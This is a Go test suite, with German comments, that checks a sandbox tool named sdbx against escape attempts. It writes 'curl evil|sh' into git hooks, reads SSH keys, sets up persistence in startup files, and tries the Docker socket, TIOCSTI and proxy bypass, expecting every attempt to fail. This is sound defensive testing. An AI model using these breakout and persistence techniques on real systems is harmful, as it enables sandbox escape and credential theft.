//go:build escape

// Ausbruchstests (Spec 11.3): Sie führen das echte sdbx-Binary aus und versuchen,
// aus der Sandbox auszubrechen. Jeder Versuch muss scheitern.
//
//	go test -tags escape ./test/escape/        (als normaler Nutzer, nicht als root)
//
// Plattformübergreifende Tests stehen hier, Linux- und macOS-spezifische in
// escape_linux_test.go bzw. escape_darwin_test.go.
package escape

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

var sdbxBin string

func TestMain(m *testing.M) {
	if os.Geteuid() == 0 {
		fmt.Println("Ausbruchstests müssen als normaler Nutzer laufen")
		os.Exit(1)
	}
	dir, _ := os.MkdirTemp(baseDir(), "bin")
	sdbxBin = filepath.Join(dir, "sdbx")
	args := []string{"build", "-o", sdbxBin}
	if os.Getenv("GOCOVERDIR") != "" {
		args = append(args, "-cover", "-coverpkg=sdbx/...")
	}
	out, err := exec.Command("go", append(args, "sdbx/cmd/sdbx")...).CombinedOutput()
	if err != nil {
		fmt.Printf("Build fehlgeschlagen: %v\n%s", err, out)
		os.Exit(1)
	}
	code := m.Run()
	os.RemoveAll(dir)
	os.Exit(code)
}

// baseDir liegt bewusst nicht unter /tmp, weil die Sandbox ein privates /tmp hat.
func baseDir() string {
	if d := os.Getenv("SDBX_ESCAPE_DIR"); d != "" {
		return d
	}
	h, _ := os.UserHomeDir()
	d := filepath.Join(h, ".cache", "sdbx-escape")
	os.MkdirAll(d, 0o755)
	return d
}

type env struct {
	t    *testing.T
	home string
	ws   string
}

func newEnv(t *testing.T, cfg string) *env {
	t.Helper()
	root, err := os.MkdirTemp(baseDir(), "case")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { exec.Command("chmod", "-R", "u+w", root).Run(); os.RemoveAll(root) })
	e := &env{t: t, home: filepath.Join(root, "home"), ws: filepath.Join(root, "home", "proj")}
	for _, d := range []string{e.ws, filepath.Join(e.home, ".ssh"), filepath.Join(e.ws, ".git", "hooks"), filepath.Join(e.ws, "a"), filepath.Join(e.ws, "b")} {
		os.MkdirAll(d, 0o755)
	}
	os.WriteFile(filepath.Join(e.home, ".ssh", "id_ed25519"), []byte("GEHEIM-SSH"), 0o600)
	os.WriteFile(filepath.Join(e.home, ".ssh", "known_hosts"), []byte("github.com ssh-ed25519 AAAA"), 0o644)
	os.WriteFile(filepath.Join(e.home, "notes.txt"), []byte("lesbar"), 0o644)
	os.WriteFile(filepath.Join(e.ws, "a", "file.txt"), []byte("x"), 0o644)
	if cfg == "" {
		cfg = "version: 1\n"
	}
	e.writeProjectCfg(cfg)
	return e
}

// writeProjectCfg schreibt den Projekt-Override unter ~/.config/sdbx/projects/.
func (e *env) writeProjectCfg(cfg string) {
	e.t.Helper()
	dir := filepath.Join(e.home, ".config", "sdbx", "projects")
	os.MkdirAll(dir, 0o755)
	body := cfg
	if !strings.Contains(cfg, "project:") {
		body = "version: 1\nproject: " + e.ws + "\n"
		rest := strings.TrimSpace(cfg)
		if strings.HasPrefix(rest, "version:") {
			if i := strings.Index(rest, "\n"); i >= 0 {
				rest = strings.TrimSpace(rest[i+1:])
			} else {
				rest = ""
			}
		}
		if rest != "" {
			body += rest + "\n"
		}
	}
	if err := os.WriteFile(filepath.Join(dir, "proj.yaml"), []byte(body), 0o644); err != nil {
		e.t.Fatal(err)
	}
}

type result struct {
	out, err string
	code     int
}

func (e *env) run(extraEnv []string, args ...string) result {
	e.t.Helper()
	return e.invoke(extraEnv, sdbxBin, args...)
}

// invoke startet einen Befehl mit der Testumgebung (HOME, PATH, …) im Workspace.
func (e *env) invoke(extraEnv []string, name string, args ...string) result {
	e.t.Helper()
	_, wait := e.start(extraEnv, name, args...)
	return wait()
}

// start startet den Befehl wie invoke im Hintergrund; wait wartet auf das Ende.
func (e *env) start(extraEnv []string, name string, args ...string) (*exec.Cmd, func() result) {
	e.t.Helper()
	cmd := exec.Command(name, args...)
	cmd.Dir = e.ws
	cmd.Env = append([]string{
		"HOME=" + e.home,
		"XDG_CONFIG_HOME=" + filepath.Join(e.home, ".config"),
		"PATH=/usr/local/bin:/usr/bin:/bin",
		"LANG=C.UTF-8",
		"TMPDIR=/tmp",
	}, extraEnv...)
	if d := os.Getenv("GOCOVERDIR"); d != "" && name == sdbxBin {
		cmd.Env = append(cmd.Env, "GOCOVERDIR="+d)
	}
	var so, se bytes.Buffer
	cmd.Stdout, cmd.Stderr = &so, &se
	if err := cmd.Start(); err != nil {
		e.t.Fatalf("Start: %v", err)
	}
	return cmd, func() result {
		err := cmd.Wait()
		code := 0
		if ee, ok := err.(*exec.ExitError); ok {
			code = ee.ExitCode()
		} else if err != nil {
			e.t.Fatalf("Wait: %v", err)
		}
		return result{so.String(), se.String(), code}
	}
}

// waitFile wartet, bis der Befehl in der Sandbox die Datei angelegt hat.
func (e *env) waitFile(name string) {
	e.t.Helper()
	for i := 0; i < 200; i++ {
		if _, err := os.Stat(filepath.Join(e.ws, name)); err == nil {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	e.t.Fatalf("%s wurde nicht angelegt", name)
}

// requireGone prüft, dass die Prozesse aus den PID-Dateien nicht mehr laufen (und beendet Überlebende).
func (e *env) requireGone(names ...string) {
	e.t.Helper()
	time.Sleep(time.Second)
	for _, name := range names {
		b, err := os.ReadFile(filepath.Join(e.ws, name))
		if err != nil {
			e.t.Errorf("%s fehlt: %v", name, err)
			continue
		}
		pid, err := strconv.Atoi(strings.TrimSpace(string(b)))
		if err != nil {
			e.t.Errorf("%s: %v", name, err)
			continue
		}
		if syscall.Kill(pid, 0) == nil {
			syscall.Kill(pid, syscall.SIGKILL)
			e.t.Errorf("%s: Prozess %d läuft nach dem Lauf weiter", name, pid)
		}
	}
}

func (e *env) sh(script string, extra ...string) result {
	return e.run(extra, "run", "-q", "--", "sh", "-c", script)
}

func (e *env) py(code string, extra ...string) result {
	return e.run(extra, "run", "-q", "--", "python3", "-c", code)
}

// hostSh und hostPy führen denselben Versuch ohne Sandbox aus (Host-Gegenprobe).
func (e *env) hostSh(script string) result {
	e.t.Helper()
	return e.invoke(nil, "sh", "-c", script)
}

func (e *env) hostPy(code string) result {
	e.t.Helper()
	return e.invoke(nil, "python3", "-c", code)
}

// config ersetzt den Projekt-Override, z. B. für die Gegenprobe mit Freigabe.
func (e *env) config(cfg string) {
	e.t.Helper()
	e.writeProjectCfg(cfg)
}

// requireHost überspringt den Test, wenn der Versuch schon ohne Sandbox scheitert
// (TCC, Yama, AppArmor, kein Netz …): Dann beweist eine Verweigerung in der Sandbox nichts.
func requireHost(t *testing.T, r result, want string) {
	t.Helper()
	if !strings.Contains(r.out+r.err, want) {
		t.Skipf("Host-Gegenprobe: %q fehlt schon ohne Sandbox\nstdout: %s\nstderr: %s", want, r.out, r.err)
	}
}

func expect(t *testing.T, r result, want string) {
	t.Helper()
	if !strings.Contains(r.out+r.err, want) {
		t.Errorf("erwartet %q\nstdout: %s\nstderr: %s\nexit: %d", want, r.out, r.err, r.code)
	}
}

func refuse(t *testing.T, r result, bad string) {
	t.Helper()
	// Startet die Sandbox gar nicht, fehlt die Ausgabe auch ohne Schutz – das beweist nichts.
	if r.code == 125 || strings.Contains(r.err, "bwrap: ") || strings.Contains(r.err, "sandbox-exec: ") {
		t.Errorf("Sandbox nicht gestartet\nstdout: %s\nstderr: %s\nexit: %d", r.out, r.err, r.code)
	}
	if strings.Contains(r.out, bad) {
		t.Errorf("Ausbruch: %q in Ausgabe\nstdout: %s\nstderr: %s", bad, r.out, r.err)
	}
}

func TestWriteOutsideWorkspace(t *testing.T) {
	e := newEnv(t, "")
	// gehört dem Nutzer und liegt außerhalb von HOME – ohne Sandbox also beschreibbar
	outside := filepath.Join(filepath.Dir(e.home), "draussen")
	os.MkdirAll(outside, 0o755)
	tryOutside := `echo y > '` + outside + `/f' && echo DRAUSSEN`
	r := e.sh(`echo x > "$HOME/draussen" && echo GESCHRIEBEN; ` + tryOutside)
	refuse(t, r, "GESCHRIEBEN")
	refuse(t, r, "DRAUSSEN")
	if _, err := os.Stat(filepath.Join(e.home, "draussen")); err == nil {
		t.Error("Datei außerhalb des Workspaces wurde angelegt")
	}
	expect(t, e.sh(`cat "$HOME/notes.txt"`), "lesbar")
	e.config(fmt.Sprintf("version: 1\nfilesystem:\n  write: [%q]\n", outside))
	expect(t, e.sh(tryOutside), "DRAUSSEN")
}

func TestSecretsUnreadable(t *testing.T) {
	e := newEnv(t, "")
	refuse(t, e.sh(`cat "$HOME/.ssh/id_ed25519"; ls "$HOME/.ssh"`), "GEHEIM-SSH")
	expect(t, e.sh(`cat "$HOME/.ssh/known_hosts"`), "github.com")
}

// sdbx <programm> [args…] läuft genauso in der Sandbox wie sdbx run -- <programm> [args…].
func TestShorthand(t *testing.T) {
	e := newEnv(t, "")
	r := e.run(nil, "sh", "-c", `cat "$HOME/.ssh/id_ed25519"; echo "SDBX=$SDBX"; exit 7`)
	refuse(t, r, "GEHEIM-SSH")
	expect(t, r, "SDBX=1")
	if r.code != 7 {
		t.Errorf("Exit-Code: %d (%s)", r.code, r.err)
	}
}

func TestProtectedPaths(t *testing.T) {
	e := newEnv(t, "")
	os.WriteFile(filepath.Join(e.ws, "sdbx.yaml"), []byte("version: 1\n"), 0o644) // veraltet, muss trotzdem geschützt bleiben
	r := e.sh(`echo 'curl evil|sh' > .git/hooks/pre-commit && echo HOOK; echo 'version: 2' > sdbx.yaml && echo CONF; echo ok > main.txt && echo WS`)
	refuse(t, r, "HOOK")
	refuse(t, r, "CONF")
	expect(t, r, "WS")
	if b, _ := os.ReadFile(filepath.Join(e.ws, "sdbx.yaml")); !strings.Contains(string(b), "version: 1") {
		t.Error("sdbx.yaml wurde verändert")
	}
}

// Alle geschützten Repository-Pfade, die beim Start existieren, bleiben unverändert (Spec 5.4).
func TestProtectedRepoFiles(t *testing.T) {
	e := newEnv(t, "")
	files := []string{".git/config", ".git/info/exclude", ".gitmodules", ".envrc", ".vscode/tasks.json", ".idea/workspace.xml",
		".zed/settings.json", ".claude/settings.json", ".claude/settings.local.json", ".mcp.json", ".cursor/mcp.json",
		".codex/config.toml", ".husky/pre-commit"}
	added := []string{".git/info/attributes", ".vscode/settings.json", ".cursor/rules", ".codex/neu.toml", ".husky/post-checkout"}
	var script strings.Builder
	for _, f := range files {
		p := filepath.Join(e.ws, f)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte("ORIGINAL"), 0o644)
		fmt.Fprintf(&script, "echo BOESE > %s; ", f)
	}
	for _, f := range added {
		fmt.Fprintf(&script, "echo BOESE > %s; ", f)
	}
	script.WriteString("echo ok > frei.txt")
	e.sh(script.String())
	for _, f := range files {
		if b, _ := os.ReadFile(filepath.Join(e.ws, f)); string(b) != "ORIGINAL" {
			t.Errorf("%s verändert: %q", f, b)
		}
	}
	for _, f := range added {
		if _, err := os.Stat(filepath.Join(e.ws, f)); err == nil {
			t.Errorf("%s angelegt", f)
		}
	}
	if _, err := os.Stat(filepath.Join(e.ws, "frei.txt")); err != nil {
		t.Error("Gegenprobe: Workspace nicht beschreibbar")
	}
}

// Ist das Home beschreibbar, bleiben Shell-Startdateien, Git-Konfiguration, Autostart und
// PATH-Verzeichnisse trotzdem geschützt (Persistenz über spätere Shells oder Anmeldungen).
func TestHomePersistence(t *testing.T) {
	e := newEnv(t, "version: 1\nfilesystem:\n  write: [\"~\"]\n")
	files := []string{".zshrc", ".bashrc", ".profile", ".gitconfig", ".config/git/config", ".config/fish/config.fish"}
	// bin/.local/bin ohne PATH-Eintrag und ohne Vorbestand: ProtectedInHome + Anlegen vor dem Start
	dirs := []string{"bin", ".local/bin", ".local/share/bin", ".config/sdbx", "Library/LaunchAgents", ".config/autostart", ".config/systemd/user"}
	for _, f := range files {
		p := filepath.Join(e.home, f)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte("ORIGINAL"), 0o644)
	}
	// Nur LaunchAgents/autostart vorab anlegen; PATH-Dirs bewusst nicht – sdbx muss sie selbst schützen
	for _, d := range []string{"Library/LaunchAgents", ".config/autostart", ".config/systemd/user"} {
		os.MkdirAll(filepath.Join(e.home, d), 0o755)
	}
	var script strings.Builder
	for _, f := range files {
		fmt.Fprintf(&script, "echo BOESE > \"$HOME/%s\"; ", f)
	}
	for _, d := range dirs {
		fmt.Fprintf(&script, "echo BOESE > \"$HOME/%s/boese\"; ", d)
	}
	script.WriteString(`echo ok > "$HOME/frei.txt"`)
	// PATH ohne ~/bin und ~/.local/bin – Schutz muss trotzdem greifen
	e.run([]string{"PATH=/usr/local/bin:/usr/bin:/bin"}, "run", "-q", "--", "sh", "-c", script.String())
	for _, f := range files {
		if b, _ := os.ReadFile(filepath.Join(e.home, f)); string(b) != "ORIGINAL" {
			t.Errorf("~/%s verändert: %q", f, b)
		}
	}
	for _, d := range dirs {
		if _, err := os.Stat(filepath.Join(e.home, d, "boese")); err == nil {
			t.Errorf("~/%s/boese angelegt", d)
		}
	}
	if _, err := os.Stat(filepath.Join(e.home, "frei.txt")); err != nil {
		t.Error("Gegenprobe: Home nicht beschreibbar")
	}
}

// Privilegienwechsel über setuid-Programme gelingt in der Sandbox nicht.
func TestSudoBlocked(t *testing.T) {
	const try = `sudo -n true && echo ROOT-OK`
	e := newEnv(t, "")
	requireHost(t, e.hostSh(try), "ROOT-OK")
	refuse(t, e.sh(try), "ROOT-OK")
}

// Eine erlaubte Domain, die auf eine interne Adresse auflöst (Loopback, Cloud-Metadaten 169.254.169.254 …),
// bleibt gesperrt; erst allow_private öffnet sie (Spec 6.3, Schritt 5). localhost steht für jede solche Domain.
func TestAllowedDomainToPrivateAddress(t *testing.T) {
	port := hostServer(t)
	// --noproxy '': auch localhost über den Proxy, wie bei jeder anderen erlaubten Domain
	try := `curl -s --noproxy '' http://localhost:` + port + `/`
	e := newEnv(t, "version: 1\nnetwork:\n  allow: [\"localhost:"+port+"\"]\n")
	r := e.sh(try)
	refuse(t, r, "VOM-HOST")
	expect(t, r, "private/lokale Adresse")
	e.config("version: 1\nnetwork:\n  allow: [\"localhost:" + port + "\"]\n  allow_private: true\n")
	expect(t, e.sh(try), "VOM-HOST")
}

// Der Docker-Socket ist Root auf dem Host (Container mit gemountetem /) und bleibt gesperrt.
func TestDockerSocketBlocked(t *testing.T) {
	const code = `import socket
s = socket.socket(socket.AF_UNIX)
try:
    s.connect("/var/run/docker.sock")
    s.sendall(b"GET /_ping HTTP/1.0\r\n\r\n")
    print(s.recv(200).decode())
except Exception as ex:
    print("BLOCKIERT", ex)`
	e := newEnv(t, "")
	requireHost(t, e.hostPy(code), "HTTP/1.")
	r := e.py(code)
	refuse(t, r, "HTTP/1.")
	expect(t, r, "BLOCKIERT")
	e.config("version: 1\nsockets:\n  allow: [/var/run/docker.sock]\n")
	expect(t, e.py(code), "HTTP/1.")
}

// Geschützte Pfade dürfen sich nicht über ein umbenanntes Elternverzeichnis ändern lassen
// (mv .git .gitx, Hook schreiben, zurückbenennen).
func TestProtectedViaRename(t *testing.T) {
	e := newEnv(t, "")
	if out, err := exec.Command("git", "-C", e.ws, "init", "-q").CombinedOutput(); err != nil {
		t.Fatalf("git init: %v %s", err, out)
	}
	os.MkdirAll(filepath.Join(e.ws, ".claude"), 0o755)
	os.WriteFile(filepath.Join(e.ws, ".claude", "settings.json"), []byte("{}"), 0o644)
	e.sh(`mv .git .gitx && echo 'curl evil|sh' > .gitx/hooks/pre-commit; [ -d .gitx ] && mv .gitx .git
mv .claude .cx && echo '{"hooks":1}' > .cx/settings.json; [ -d .cx ] && mv .cx .claude; true`)
	if _, err := os.Stat(filepath.Join(e.ws, ".git", "hooks", "pre-commit")); err == nil {
		t.Error("Hook über umbenanntes .git geschrieben")
	}
	if b, _ := os.ReadFile(filepath.Join(e.ws, ".claude", "settings.json")); string(b) != "{}" {
		t.Errorf(".claude/settings.json über Umbenennen geändert: %s", b)
	}
	// Gegenprobe: Git arbeitet im Workspace weiter
	expect(t, e.sh(`echo a > f && git -c user.email=t@t -c user.name=t add f && git -c user.email=t@t -c user.name=t commit -qm x && git checkout -qb zweig && echo GIT-OK`), "GIT-OK")
}

// Repositories, die während des Laufs entstehen oder tief liegen, sind ebenfalls geschützt bzw. werden gemeldet.
func TestNewAndDeepRepos(t *testing.T) {
	e := newEnv(t, "")
	deep := filepath.Join(e.ws, "a", "b", "c", "d", "e")
	if out, err := exec.Command("git", "init", "-q", deep).CombinedOutput(); err != nil {
		t.Fatalf("git init: %v %s", err, out)
	}
	// bestehendes Repository in Tiefe 5
	e.sh(`echo 'curl evil|sh' > a/b/c/d/e/.git/hooks/pre-commit`)
	if _, err := os.Stat(filepath.Join(deep, ".git", "hooks", "pre-commit")); err == nil {
		t.Error("Hook in tiefem Repository geschrieben")
	}
	// Gegenprobe: init und clone im Workspace funktionieren
	expect(t, e.sh(`git init -q neu && git clone -q a/b/c/d/e klon 2>/dev/null && echo GIT-OK`), "GIT-OK")
	// im vorigen Lauf angelegtes Repository ist jetzt geschützt; ein im selben Lauf angelegtes wird gemeldet
	r := e.sh(`echo 'curl evil|sh' > neu/.git/hooks/pre-commit
mkdir -p x/hooks && echo 'curl evil|sh' > x/hooks/post-checkout && git init -q umweg && rm -rf umweg/.git && mv x umweg/.git`)
	if _, err := os.Stat(filepath.Join(e.ws, "neu", ".git", "hooks", "pre-commit")); err == nil {
		t.Error("Hook in Repository aus dem vorigen Lauf geschrieben")
	}
	expect(t, r, "umweg wurde in der Sandbox angelegt")
	expect(t, r, "aktive Hooks: post-checkout")
}

func TestMoveAcrossDirectories(t *testing.T) {
	e := newEnv(t, "")
	expect(t, e.py(`import os; os.rename("a/file.txt", "b/file.txt"); print("RENAME-OK")`), "RENAME-OK")
}

func TestEnvAllowlist(t *testing.T) {
	e := newEnv(t, "")
	refuse(t, e.sh(`echo "URL=$URL"`, "URL=nicht-durchgereicht"), "nicht-durchgereicht")
	e.config("version: 1\nenv:\n  passthrough: [URL]\n")
	expect(t, e.sh(`echo "URL=$URL"`, "URL=durchgereicht"), "URL=durchgereicht")
}

func TestEnvSecretsRemoved(t *testing.T) {
	e := newEnv(t, "")
	r := e.sh(`env`, "AWS_SECRET_ACCESS_KEY=geheim1", "GITHUB_TOKEN=geheim2", "RANDOM_VAR=sichtbar?")
	refuse(t, r, "geheim1")
	refuse(t, r, "geheim2")
	refuse(t, r, "sichtbar?")
	expect(t, r, "SDBX=1")
}

// pyHTTP nutzt den Proxy ausdrücklich (unabhängig von NO_PROXY).
const pyHTTP = `
import os, urllib.request, sys
os.environ.pop("NO_PROXY", None); os.environ.pop("no_proxy", None)
opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": os.environ.get("HTTP_PROXY", "")}))
try:
    r = opener.open(sys.argv[1], timeout=5)
    print("STATUS", r.status, r.read().decode())
except urllib.error.HTTPError as e:
    print("HTTPERR", e.code, e.read().decode())
except Exception as e:
    print("FEHLER", e)
`

func hostServer(t *testing.T) (port string) {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, "VOM-HOST") })}
	go srv.Serve(l)
	t.Cleanup(func() { srv.Close() })
	_, port, _ = net.SplitHostPort(l.Addr().String())
	return port
}

// Ctrl-C trifft die ganze Prozessgruppe. Agenten fangen es ab und arbeiten weiter – das Netz muss bleiben.
func TestNetworkSurvivesCtrlC(t *testing.T) {
	port := hostServer(t)
	e := newEnv(t, "version: 1\nnetwork:\n  allow: [\"127.0.0.1/32\"]\n")
	r := e.run(nil, "run", "-q", "--", "python3", "-c", `import os, signal, time
signal.signal(signal.SIGINT, signal.SIG_IGN)
os.kill(0, signal.SIGINT)
time.sleep(0.5)
`+pyHTTP, "http://127.0.0.1:"+port+"/")
	expect(t, r, "STATUS 200 VOM-HOST")
}

func TestNetworkProxy(t *testing.T) {
	port := hostServer(t)
	e := newEnv(t, "version: 1\nnetwork:\n  allow: [\"127.0.0.1/32\", localhost]\n")
	// erlaubt über CIDR
	get := func(url string) result { return e.run(nil, "run", "-q", "--", "python3", "-c", pyHTTP, url) }
	expect(t, get("http://127.0.0.1:"+port+"/"), "STATUS 200 VOM-HOST")
	// nicht freigegeben
	expect(t, get("http://nicht-erlaubt.invalid/"), "HTTPERR 403")
	// Domain erlaubt, löst aber privat auf → DNS-Rebinding-Schutz (ohne CIDR-Freigabe)
	e.config("version: 1\nnetwork:\n  allow: [localhost]\n")
	r0 := get("http://localhost:" + port + "/")
	expect(t, r0, "private")
	refuse(t, r0, "VOM-HOST")
	e.config("version: 1\nnetwork:\n  allow: [\"127.0.0.1/32\"]\n")
	// direkte Verbindung am Proxy vorbei
	r := e.py(`import socket
s = socket.socket()
s.settimeout(3)
try:
    s.connect(("127.0.0.1", ` + port + `)); s.send(b"GET / HTTP/1.0\r\n\r\n"); print(s.recv(100))
except Exception as ex:
    print("BLOCKIERT", ex)`)
	expect(t, r, "BLOCKIERT")
	refuse(t, r, "VOM-HOST")
}

// UDP/DNS direkt am Proxy vorbei.
func TestUDPBlocked(t *testing.T) {
	const try = `import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    s.sendto(b"x", ("8.8.8.8", 53)); print("GESENDET")
except Exception as ex:
    print("BLOCKIERT", ex)`
	e := newEnv(t, "")
	requireHost(t, e.hostPy(try), "GESENDET")
	expect(t, e.py(try), "BLOCKIERT")
	e.config("version: 1\nnetwork: host\n")
	expect(t, e.py(try), "GESENDET")
}

func TestNetworkLocal(t *testing.T) {
	port := hostServer(t)
	code := `import urllib.request, sys
try:
    print("STATUS", urllib.request.urlopen(sys.argv[1], timeout=5).read().decode())
except Exception as ex:
    print("FEHLER", ex)`
	e := newEnv(t, "")
	refuse(t, e.run(nil, "run", "-q", "--", "python3", "-c", code, "http://127.0.0.1:"+port+"/"), "VOM-HOST")
	e.config("version: 1\nnetwork:\n  local: [" + port + "]\n")
	expect(t, e.run(nil, "run", "-q", "--", "python3", "-c", code, "http://127.0.0.1:"+port+"/"), "STATUS VOM-HOST")
}

func TestNetworkNone(t *testing.T) {
	port := hostServer(t)
	e := newEnv(t, "version: 1\nnetwork: none\n")
	r := e.run(nil, "run", "-q", "--", "python3", "-c", pyHTTP, "http://127.0.0.1:"+port+"/")
	refuse(t, r, "VOM-HOST")
	expect(t, e.sh(`env | grep -c HTTP_PROXY || true`), "0")
}

func TestUnixSockets(t *testing.T) {
	e := newEnv(t, "")
	dir := filepath.Join(e.home, ".config", "tool")
	os.MkdirAll(dir, 0o755)
	sock := filepath.Join(dir, "agent.sock")
	l, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	defer l.Close()
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			c.Write([]byte("AGENT-ANTWORT"))
			c.Close()
		}
	}()
	code := `import socket, sys
s = socket.socket(socket.AF_UNIX)
try:
    s.connect(sys.argv[1]); print(s.recv(100))
except Exception as ex:
    print("BLOCKIERT", ex)`
	r := e.run(nil, "run", "-q", "--", "python3", "-c", code, sock)
	refuse(t, r, "AGENT-ANTWORT")
	// Freigabe über sockets.allow
	e.config("version: 1\nsockets:\n  allow: [\"" + sock + "\"]\n")
	expect(t, e.run(nil, "run", "-q", "--", "python3", "-c", code, sock), "AGENT-ANTWORT")
	// eigener Socket im Workspace funktioniert
	expect(t, e.py(`import socket, os
p = "own.sock"
srv = socket.socket(socket.AF_UNIX); srv.bind(p); srv.listen(1)
c = socket.socket(socket.AF_UNIX); c.connect(p); print("EIGENER-SOCKET-OK")`), "EIGENER-SOCKET-OK")
}

func TestTIOCSTIBlocked(t *testing.T) {
	e := newEnv(t, "")
	expect(t, e.py(`import fcntl, termios, errno
try:
    fcntl.ioctl(0, termios.TIOCSTI, b"x"); print("INJECTED")
except OSError as ex:
    print("ERRNO", errno.errorcode[ex.errno])`), "ERRNO EPERM")
}

func TestGlobDeny(t *testing.T) {
	e := newEnv(t, "version: 1\nfilesystem:\n  deny: [\"**/.env\"]\n")
	os.WriteFile(filepath.Join(e.ws, "a", ".env"), []byte("DB_PASS=geheim"), 0o644)
	refuse(t, e.sh(`cat a/.env`), "geheim")
	e.config("version: 1\n")
	expect(t, e.sh(`cat a/.env`), "geheim")
}

func TestExitCodes(t *testing.T) {
	e := newEnv(t, "")
	if r := e.sh(`exit 7`); r.code != 7 {
		t.Errorf("Exit-Code: %d", r.code)
	}
	if r := e.run(nil, "run", "--", "gibt-es-nicht"); r.code != 127 {
		t.Errorf("nicht gefunden: %d (%s)", r.code, r.err)
	}
	if r := e.run(nil, "gibt-es-nicht"); r.code != 127 {
		t.Errorf("Kurzform nicht gefunden: %d (%s)", r.code, r.err)
	}
	if r := e.sh(`kill -TERM $$`); r.code != 128+15 {
		t.Errorf("Signal: %d", r.code)
	}
	e.config("version: 1\nfoo: 1\n")
	if r := e.sh(`true`); r.code != 125 || !strings.Contains(r.err, "unbekannter Schlüssel") {
		t.Errorf("Konfigurationsfehler: %d %s", r.code, r.err)
	}
}

func TestTimeoutKillsTree(t *testing.T) {
	e := newEnv(t, "version: 1\nlimits:\n  timeout: 2s\n  kill_grace: 1s\n")
	start := time.Now()
	r := e.sh(`sleep 300 >/dev/null 2>&1 & echo $! > pid-bg
python3 -c '
import os
if os.fork() == 0:
    os.setsid()
    fd = os.open("/dev/null", os.O_RDWR)
    for i in (0, 1, 2):
        os.dup2(fd, i)
    open("pid-daemon", "w").write(str(os.getpid()))
    os.execvp("sleep", ["sleep", "300"])
'
trap "" TERM; wait`)
	if r.code != 124 {
		t.Errorf("Timeout-Exit: %d %s", r.code, r.err)
	}
	if time.Since(start) > 15*time.Second {
		t.Error("Timeout greift zu spät")
	}
	e.requireGone("pid-bg", "pid-daemon")
}

// Ein Befehl, der SIGTERM dauerhaft ignoriert, endet nach kill_grace per SIGKILL.
func TestTimeoutEscalatesToKill(t *testing.T) {
	e := newEnv(t, "version: 1\nlimits:\n  timeout: 1s\n  kill_grace: 1s\n")
	start := time.Now()
	r := e.sh(`trap "" TERM; echo $$ > pid-sh; while :; do sleep 0.2; done`)
	if r.code != 124 {
		t.Errorf("Timeout-Exit: %d %s", r.code, r.err)
	}
	if d := time.Since(start); d > 10*time.Second {
		t.Errorf("SIGKILL nach kill_grace greift zu spät (%s)", d)
	}
	e.requireGone("pid-sh")
}

// SIGTERM an sdbx erreicht den Befehl (der aufräumen kann); abgelöste Prozesse enden trotzdem.
func TestSignalForwarded(t *testing.T) {
	e := newEnv(t, "")
	cmd, wait := e.start(nil, sdbxBin, "run", "-q", "--", "sh", "-c",
		`trap 'echo TERM-ERHALTEN; exit 3' TERM; sleep 300 >/dev/null 2>&1 & echo $! > pid-bg; touch bereit; while :; do sleep 0.1; done`)
	e.waitFile("bereit")
	cmd.Process.Signal(syscall.SIGTERM)
	r := wait()
	expect(t, r, "TERM-ERHALTEN")
	if r.code != 3 {
		t.Errorf("Exit-Code %d, erwartet 3 (vom Befehl)\nstderr: %s", r.code, r.err)
	}
	e.requireGone("pid-bg")
}

// Nach dem Lauf darf kein Prozess aus der Sandbox weiterlaufen, auch keiner, der sich
// vom Elternprozess löst (Hintergrund, nohup, Daemon mit Doppel-Fork und setsid) –
// auch ohne PID-Namespace, wie ihn die clausona-Integration erzwingt.
func TestNoSurvivors(t *testing.T) {
	t.Run("Standard", func(t *testing.T) { noSurvivors(t, "") })
	t.Run("ohne PID-Namespace", func(t *testing.T) { noSurvivors(t, "version: 1\nprocess:\n  isolate_pids: false\n") })
}

func noSurvivors(t *testing.T, cfg string) {
	e := newEnv(t, cfg)
	r := e.sh(`sleep 60 >/dev/null 2>&1 & echo $! > pid-bg
nohup sleep 60 >/dev/null 2>&1 & echo $! > pid-nohup
python3 -c '
import os
if os.fork() == 0:
    os.setsid()
    if os.fork() == 0:
        fd = os.open("/dev/null", os.O_RDWR)
        for i in (0, 1, 2):
            os.dup2(fd, i)
        open("pid-daemon", "w").write(str(os.getpid()))
        os.execvp("sleep", ["sleep", "60"])
    os._exit(0)
os.wait()
'
sleep 0.5; echo GESTARTET`)
	expect(t, r, "GESTARTET")
	e.requireGone("pid-bg", "pid-nohup", "pid-daemon")
}

func TestCheckExplainPolicy(t *testing.T) {
	e := newEnv(t, "version: 1\nnetwork:\n  allow: [github.com]\n")
	expect(t, e.run(nil, "check"), "Konfiguration ist gültig")
	expect(t, e.run(nil, "explain", "~/.ssh/id_ed25519"), "Secret-Sperrliste")
	expect(t, e.run(nil, "explain", "github.com"), "erlaubt")
	expect(t, e.run(nil, "explain", "evil.com:443"), "blockiert")
	r := e.run(nil, "policy", "--format", "json")
	var v map[string]any
	if err := json.Unmarshal([]byte(r.out), &v); err != nil {
		t.Errorf("policy json: %v", err)
	}
	expect(t, e.run(nil, "policy", "--format", "bwrap"), "--unshare-net")
}

func TestClausonaRO(t *testing.T) {
	e := newEnv(t, "version: 1\nintegrations:\n  clausona: ro\n")
	work := filepath.Join(e.home, ".claude-work")
	os.MkdirAll(filepath.Join(work, "projects"), 0o755)
	os.MkdirAll(filepath.Join(e.home, ".claude"), 0o755)
	os.WriteFile(filepath.Join(work, "settings.json"), []byte(`{"hooks":{}}`), 0o644)
	os.WriteFile(filepath.Join(e.home, ".claude", ".credentials.json"), []byte("PRIMAER-TOKEN"), 0o600)
	os.MkdirAll(filepath.Join(e.home, ".clausona"), 0o755)
	reg := `{"version":2,"primarySources":{"claude":"~/.claude"},"activeProfiles":{"claude":"claude:work"},
"profiles":{"claude:personal":{"tool":"claude","configDir":"~/.claude","email":"a","isPrimary":true},
